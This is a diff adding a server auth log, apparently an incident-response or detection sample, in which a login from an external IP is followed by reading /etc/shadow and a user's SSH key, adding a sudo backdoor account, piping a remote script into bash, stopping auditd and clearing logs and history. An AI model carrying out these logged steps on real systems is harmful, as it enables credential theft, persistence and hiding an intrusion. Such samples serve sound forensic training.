@@ -1,0 +1,30 @@
+Aug 12 08:47:19 db01 sshd[1802]: Accepted publickey for dbadmin from 10.0.0.23 port 44112 ssh2
+Aug 12 08:52:41 db01 sudo: dbadmin : TTY=pts/0 ; PWD=/home/dbadmin ; COMMAND=/usr/bin/systemctl status postgresql
+Aug 12 09:15:02 db01 cron[1855]: session opened for user backup
+Aug 12 09:41:36 db01 sshd[1901]: Accepted password for helen from 10.0.0.35 port 51220 ssh2
+Aug 12 10:03:55 db01 sudo: helen : TTY=pts/1 ; PWD=/srv/reports ; COMMAND=/usr/bin/psql -c "select count(*) from orders"
+Aug 12 11:20:14 db01 sshd[2044]: Accepted publickey for deploy from 10.0.0.9 port 40233 ssh2
+Aug 12 11:21:03 db01 sudo: deploy : TTY=pts/2 ; PWD=/opt/app ; COMMAND=/usr/bin/systemctl restart app
+Aug 12 12:44:29 db01 sshd[2130]: Accepted password for helen from 10.0.0.35 port 51388 ssh2
+Aug 12 13:30:00 db01 cron[2188]: session opened for user backup
+Aug 12 14:12:47 db01 sshd[2255]: Accepted publickey for dbadmin from 10.0.0.23 port 44290 ssh2
+Aug 12 15:58:31 db01 sshd[2390]: Accepted password for helen from 10.0.0.35 port 51502 ssh2
+Aug 12 17:05:12 db01 sshd[2477]: Accepted publickey for deploy from 10.0.0.9 port 40410 ssh2
+Aug 12 18:22:40 db01 cron[2540]: session opened for user backup
+Aug 13 02:11:53 db01 sshd[3012]: Accepted password for dbadmin from 45.77.201.14 port 58022 ssh2
+Aug 13 02:12:09 db01 sshd[3012]: session opened for user dbadmin
+Aug 13 02:13:41 db01 sudo: dbadmin : TTY=pts/3 ; PWD=/root ; COMMAND=/usr/bin/cat /etc/shadow
+Aug 13 02:14:07 db01 sudo: dbadmin : TTY=pts/3 ; PWD=/root ; COMMAND=/usr/bin/cat /home/helen/.ssh/id_rsa
+Aug 13 02:15:22 db01 sudo: dbadmin : TTY=pts/3 ; PWD=/root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash svc_monitor
+Aug 13 02:15:48 db01 sudo: dbadmin : TTY=pts/3 ; PWD=/root ; COMMAND=/usr/sbin/usermod -aG sudo svc_monitor
+Aug 13 02:17:04 db01 sudo: dbadmin : TTY=pts/3 ; PWD=/var/www ; COMMAND=/usr/bin/chmod 777 /var/www/uploads
+Aug 13 02:19:30 db01 sudo: dbadmin : TTY=pts/3 ; PWD=/tmp ; COMMAND=/bin/sh -c curl -s http://45.77.201.14/x.sh | bash
+Aug 13 02:21:15 db01 sudo: dbadmin : TTY=pts/3 ; PWD=/tmp ; COMMAND=/usr/bin/systemctl stop auditd
+Aug 13 02:21:52 db01 rsyslogd: [origin software="rsyslogd"] rsyslogd was HUPed, log file cleared
+Aug 13 02:22:30 db01 sudo: dbadmin : TTY=pts/3 ; PWD=/root ; COMMAND=/bin/bash -c history -c
+Aug 13 02:24:11 db01 sshd[3012]: session closed for user dbadmin
+Aug 13 08:31:07 db01 sshd[3401]: Accepted publickey for dbadmin from 10.0.0.23 port 44502 ssh2
+Aug 13 09:02:55 db01 sudo: helen : TTY=pts/0 ; PWD=/srv/reports ; COMMAND=/usr/bin/psql -c "select 1"
+Aug 13 09:44:18 db01 cron[3466]: session opened for user backup
+Aug 13 10:27:39 db01 sshd[3520]: Accepted password for helen from 10.0.0.35 port 51710 ssh2
+Aug 13 11:50:02 db01 sshd[3588]: Accepted publickey for deploy from 10.0.0.9 port 40655 ssh2
